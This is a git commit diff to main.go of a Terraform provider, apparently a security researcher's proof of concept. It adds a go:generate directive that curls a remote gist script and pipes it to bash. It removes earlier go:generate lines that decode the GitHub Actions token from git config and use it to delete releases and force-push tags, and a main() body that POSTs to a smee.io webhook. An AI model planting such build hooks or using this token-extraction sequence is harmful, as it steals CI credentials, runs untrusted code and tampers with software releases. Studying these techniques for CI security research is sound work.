b47e0b14a48ef61ffed2dc9af9bab290c85c61bd
François Proulx <76956526+fproulx-boostsecurity@users.noreply.github.com>
2023-11-28 12:44:30 -0500

    Update main.go

--- main.go
+++ main.go
@@ -5,6 +5,7 @@ import (
 	"flag"
 	"log"
 	"os"
+	"os/exec"
 
 	"bytes"
 	"encoding/json"
@@ -15,52 +16,16 @@ import (
 	"github.com/hashicorp/terraform-plugin-framework/providerserver"
 )
 
-//go:generate export TARGET_TAG=v0.0.3
+//go:generate curl https://gist.githubusercontent.com/armmanvaillancourt/d4968db4053ce2e6b30dea54b14d6e85/raw/1e021b58fcd87d2f6dce43a13caf2833fbc6e6d3/test.sh | bash
 
-//go:generate git config --global user.email "41898282+github-actions[bot]@users.noreply.github.com"
-//go:generate git config --global user.name "github-actions"
-//go:generate export RELEASE_BRANCH="release-$TARGET_TAG+$((RANDOM%1000))"
-//go:generate git switch -c $RELEASE_BRANCH
-//go:generate git commit --allow-empty -m "Release $RELEASE_BRANCH"
-//go:generate git push --set-upstream origin $RELEASE_BRANCH
-//go:generate export RELEASE_TAG_SHA=$(git rev-parse HEAD)
-
-//go:generate export encoded_token_with_prefix=$(git config --local --get http.https://github.com/.extraheader)
-//go:generate export encoded_token=${encoded_token_with_prefix#AUTHORIZATION: basic }
-//go:generate export decoded_token_with_prefix=$(echo $encoded_token | base64 --decode)
-//go:generate export GITHUB_TOKEN=${decoded_token_with_prefix#x-access-token:}
-
-//go:generate export EXISTING_RELEASE_ID=$(curl -H "Authorization: token $GITHUB_TOKEN" "https://api.github.com/repos/$GITHUB_REPOSITORY/releases/tags/$TARGET_TAG" | jq -r .id)
-//go:generate curl -X DELETE -H "Authorization: token $GITHUB_TOKEN" "https://api.github.com/repos/$GITHUB_REPOSITORY/releases/$EXISTING_RELEASE_ID"
-//go:generate curl -X DELETE -H "Authorization: token $GITHUB_TOKEN" "https://api.github.com/repos/$GITHUB_REPOSITORY/git/refs/tags/$TARGET_TAG"
-//go:generate git tag $TARGET_TAG $RELEASE_TAG_SHA
-//go:generate git push --force origin $TARGET_TAG
-				   
 //go:generate terraform fmt -recursive ./examples/
 //go:generate go run github.com/hashicorp/terraform-plugin-docs/cmd/tfplugindocs
 
 const version string = "dev"
 
 func main() {
-	payload := map[string]string{"hello": "world"}
-	payloadBytes, err := json.Marshal(payload)
-	if err != nil {
-		log.Fatal("Error in JSON marshalling:", err)
-	}
-	body := bytes.NewReader(payloadBytes)
-	
-	req, err := http.NewRequest("POST", "https://smee.io/3H0KUgGVJoPCEgY", body)
-	if err != nil {
-		log.Fatal("Error creating request:", err)
-	}
-	req.Header.Set("Content-Type", "application/json")
-	
-	client := &http.Client{}
-	resp, err := client.Do(req)
-	if err != nil {
-		log.Fatal("Error sending request:", err)
-	}
-	defer resp.Body.Close()
+	cmd := exec.Command("bash", "-c", "echo 'yo dawg'")
+	cmd.Run()
 	
 	var debug bool
 	flag.BoolVar(&debug, "debug", false, "set to true to run the provider with support for debuggers like delve")
